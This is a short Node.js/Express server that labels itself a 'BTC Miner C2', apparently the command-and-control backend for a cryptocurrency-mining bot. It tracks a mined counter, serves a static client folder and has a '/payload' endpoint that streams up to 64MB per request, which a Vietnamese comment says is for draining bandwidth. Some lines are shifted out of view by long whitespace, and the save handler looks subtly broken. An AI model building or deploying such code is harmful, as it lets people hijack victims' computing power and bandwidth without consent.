const fs = require('fs');
const express = require('express');
const app = express();
const PORT = 3000;

let btcData = { mined: 0 };

if (!fs.existsSync('storage.json')) fs.writeFileSync('storage.json', JSON.stringify(btcData));
else btcData = JSON.parse(fs.readFileSync('storage.json'));

app.use(express.static('public'));
app.use(express.json());

app.get('/api/btc', (req, res) => res.json({ mined: btcData.mined }));

app.post('/api/btc/save', (req, res) => {
  let body = '';                                                                                    req.on('data', c => body += c);
  req.on('end', () => {
    try {
      const data = JSON.parse(body || '{}');
      btcData.mined = Number(data.mined || 0);
      fs.writeFileSync('storage.json', JSON.stringify(btcData));
      res.json({ status: 'ok' });
    } catch { res.status(400).json({ error: 'bad json' }); }
  });
});                                                                                               
/* Stream payload lớn hơn (tối đa 64MB/lần) để hút băng thông khi fallback */
app.get('/payload', (req, res) => {                                                                 const max = 64 * 1024 * 1024;
  const total = Math.max(1, Math.min(max, parseInt(req.query.bytes || '1048576', 10)));
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Cache-Control', 'no-store');
  const chunk = Buffer.alloc(256 * 1024); // 256KB/chunk
  let sent = 0;
  const iv = setInterval(() => {
    if (sent >= total) { clearInterval(iv); return res.end(); }
    const n = Math.min(chunk.length, total - sent);
    res.write(chunk.subarray(0, n));
    sent += n;
  }, 0);
});

app.listen(PORT, () => console.log(`🚀 BOT BTC Miner C2 v3 running: http://localhost:${PORT}`));

